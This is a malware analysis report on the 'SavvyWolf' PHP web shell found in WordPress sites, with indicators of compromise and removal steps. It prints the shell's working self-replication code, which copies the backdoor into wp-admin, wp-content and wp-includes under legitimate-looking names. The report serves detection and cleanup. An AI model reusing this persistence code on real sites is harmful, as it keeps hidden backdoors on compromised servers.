---
title: 'SavvyWolf Web Shell - Manager Variant'
slug: 'savvywolf-web-shell-manager-variant'
metaDescription: 'Technical analysis of the SavvyWolf Web Shell. Learn how this self-replicating PHP backdoor uses directory walking to maintain persistence in wp-admin and wp-includes.'
reportDate: '2026-01-31'
threatType: 'PHP Backdoor / Web Shell'
severity: 'High'
fileHash: 'savvywolf-php-web-shell'
detectedPaths: ['edit-wolf.php']
screenshots:
  ['/images/wordpress-threats/savvywolf-php-web-shell_evidence-1.png']
vtLink: 'https://www.virustotal.com/gui/file/f5dddeed7490345da028b13ad17c5d8ef6a6369abd507b717fb268545cff995e'
vtScore: '0/61 (FUD)'
impact: 'The site becomes vulnerable to unauthorized access and file manipulation. Attackers can upload, edit, and execute files remotely, compromising site integrity and security.'
seenOn: "The files were found primarily within the '/wp-content/', '/wp-admin/', and '/wp-includes/widgets/' directories of a WordPress installation."
behavior: 'The malware automatically installs copies of itself to maintain persistence and provides a visual interface for server management.'
difficulty: 'Moderate'
recurrence: 'High'
numberOfSiteFixed: '1'
---

## Technical Analysis

The SavvyWolf Web Shell is a sophisticated PHP backdoor disguised within a WordPress environment. It self-replicates by copying itself to key WordPress directories, such as 'wp-admin' and 'wp-includes', to ensure persistence even if detected in one location. The shell masquerades as a legitimate WordPress file, making detection difficult. Once operational, it provides a web-based GUI for file management and server control without the need for FTP or SSH, leveraging its root access to the infected WordPress directory.

> **VirusTotal Analysis:** 🛡️ **Zero-Day / Fully Undetected.**

## Attack Chain

1. Initial deployment via an exploited vulnerability or compromised credentials.
2. Upon execution, identifies WordPress root directory and attempts to replicate itself in strategic locations.
3. Provides a GUI for attackers to manage server files and directory structures.

## Code Signature(s)

### FILE: `edit-wolf.php`

```php
<?php
$backups = [];
$self = __FILE__;
$found_public_html = false;

function walk_backwards_to_find_wp($path) {
    while ($path !== dirname($path)) {
        if (
            is_dir($path . '/wp-content') &&
            is_dir($path . '/wp-admin') &&
            is_dir($path . '/wp-includes/widgets')
        ) {
            return $path;
        }
        $path = dirname($path);
    }
    return false;
}

$current_path = realpath(__DIR__);
$try_base = '';

if (strpos($current_path, 'public_html') !== false) {
    $try_base = substr($current_path, 0, strpos($current_path, 'public_html') + strlen('public_html'));
} else {
    $try_base = walk_backwards_to_find_wp($current_path);
}

if ($try_base && is_dir($try_base)) {
    $admin = $try_base . "/wp-admin";
    $content = $try_base . "/wp-content";
    $widgets = $try_base . "/wp-includes/widgets";

    if (is_dir($admin)) {
        $target1 = $admin . "/admin-wolf.php";
        copy($self, $target1);
        $backups[] = $target1;
    }

    if (is_dir($content)) {
        $target2 = $content . "/edit-wolf.php";
        copy($self, $target2);
        $backups[] = $target2;
    }

    if (is_dir($widgets)) {
        $target3 = $widgets . "/class-wp-wolf-widget.php";
        copy($self, $target3);
        $backups[] = $target3;
    }

    $found_public_html = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>SavvyWolf</title>
<link rel="icon" type="image/png" href="https://static.vecteezy.com/system/resources/thumbnails/003/381/259/small_2x/wolf-head-logo-design-template-free-vector.jpg">
<style>
    body { font-family: Arial, sans-serif; background: #111; color: #eee; margin: 0; padding: 0; }
    #container { max-width: 800px; margin: 20px auto; padding: 20px; border: 1px solid #444; border-radius: 5px; background-color: #1c1c1c; }
    h1 {
        text-align: center;
        color: #fff;
        font-size: 28px;
    }
```

## Indicators of Compromise (IOCs)

- `/wp-admin/admin-wolf.php`
- `/wp-content/edit-wolf.php`
- `/wp-includes/widgets/class-wp-wolf-widget.php`
- `SavvyWolf`
- `public_html`

## Removal Protocol

1. Simultaneously delete '/wp-admin/admin-wolf.php', '/wp-content/edit-wolf.php', and '/wp-includes/widgets/class-wp-wolf-widget.php'.
1. Search the database for references to 'wolf' or specific filenames and remove them.
1. Review server access logs for suspicious POST requests to these files and block identified IPs.
1. Verify and secure file permissions for the 'wp-includes' and 'wp-admin' directories.

> **Status:** Active Threat.  
> **Verification:** Verified by MD Pabel.
